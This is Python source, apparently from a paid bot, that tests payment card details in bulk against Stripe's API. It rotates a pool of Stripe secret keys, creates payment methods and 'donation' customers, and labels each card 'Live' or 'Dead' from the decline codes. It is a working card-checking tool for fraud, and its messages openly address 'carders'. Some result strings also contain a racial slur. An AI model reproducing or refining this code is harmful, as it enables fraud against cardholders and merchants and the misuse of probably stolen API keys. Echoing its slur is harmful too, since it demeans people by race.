from FUNC.usersdb_func import *


def create_auth(fullcc):
    import random
    from FUNC.defs import check_stripe
    sks = open("FILES/sks.txt",encoding="UTF-8").read().splitlines()
    try:
        sk = random.choice(sks)
    except IndexError:
        sk = open("FILES/sk.txt",encoding="UTF-8").read()
    if check_stripe(sk)==False:
        open('FILES/sks.txt', 'w',encoding="UTF-8").close()
        amt = 0
        for x in sks:
            if x in sk or x==sk:
                pass
            else:
                amt += 1
                if amt==1:
                    with open("FILES/sks.txt","a",encoding="UTF-8") as f:
                        f.write(x)
                else:
                    with open("FILES/sks.txt","a",encoding="UTF-8") as f:
                        f.write(f"\n{x}")
    else:
        pass
    try:
        import requests
        splitter = fullcc.split("|")
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = splitter[3]
        url1 = "https://api.stripe.com/v1/payment_methods"
        headers1 = {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_methods",
    "scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "authorization": f"Bearer {sk}",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",}
        data1 = f"type=card&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}"
        amt = 0
        while True:
            r1 = requests.post(url1, data=data1, headers=headers1)
            result1 = r1.text
            if "Request rate limit exceeded." in result1:
                amt += 1
                continue
            else:
                if "Invalid API Key provided" in result1 or "testmode_charges_only" in result1 or "api_key_expired" in result1:
                    return result1
                elif "generic_decline" in result1:
                    return result1
                else:
                    try:
                        id = r1.json()["id"]
                    except Exception as e:
                        return result1
                    break
        url2 = "https://api.stripe.com/v1/customers"
        headers2 = {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/customers",
    "scheme": "https",
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "authorization": f"Bearer {sk}",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        }
        data2 = f"description=donation&payment_method={id}"
        amt = 0
        while True:
            r2 = requests.post(url2, data=data2, headers=headers2)
            result2 = r2.text
            if "Request rate limit exceeded." in result2:
                amt += 1
                continue
            else:
                try:
                    cus = r2.json()["id"]
                    return "succeeded"
                except:
                    return result2
                break
    except Exception as e:
        with open("error_logs.txt", "a") as f:
            f.write(f"{e}\n")


def getmassresult(fullcc, user_id):
    try:
        result = create_auth(fullcc)
        if '"seller_message": "Payment complete."' in result or "succeeded" in result:
            status = "Live 🟢"
            response = "CVV LIVE ✅"
            

        elif "insufficient_funds" in result or "card has insufficient funds." in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"
            

        elif "incorrect_cvc" in result or "security code is incorrect." in result or "Your card's security code is incorrect." in result or "Your card's security code is invalid." in result or "invalid_cvc" in result:
            status = "Live 🟡"
            response = "CCN Live ❎"
            

        elif "transaction_not_allowed" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"
            

        elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
            status = "Live 🟡"
            response = "3D Secure Redirected ❎"
            

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟡"
            response = "3D Secured ❎"
            

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            

        elif "generic_decline" in result or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in result or "card_decline_rate_limit_exceeded" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "𝐃𝐈𝐃 𝐍𝐎𝐓 𝐇𝐎𝐍𝐎𝐑 𝐘𝐎𝐔 𝐀𝐒 𝐀 𝐂𝐀𝐑𝐃𝐄𝐑 𝐋𝐌𝐀𝐎💔❌"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"

        elif "incorrect_number" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "Captcha 😥"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card's expiration year is invalid." in result or "Your card\'s expiration year is invalid." in result:
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"

        elif "Your card's expiration month is invalid." in result or "invalid_expiry_month" in result:
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"

        elif "Invalid API Key provided" in result or "testmode_charges_only" in result or "api_key_expired" in result:
            status = "Dead 🔴"
            response = "SK DEAD 🚫"
            refundcredit(user_id)

        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        else:
            status = "Dead 🔴"
            response = f"Card Declined 🚫"
            with open("result_logs.txt", "a") as f:
                mtcresp = f"{result}\n"
                f.write(mtcresp)
            refundcredit(user_id)
        return (f"<code>{fullcc}</code>\n<b>𝐑𝐄𝐒𝐔𝐋𝐓 ⟿ {response}</b>\n")
    except Exception as e:
        with open("error_logs.txt", "a") as f:
            f.write(f"{e}\n")
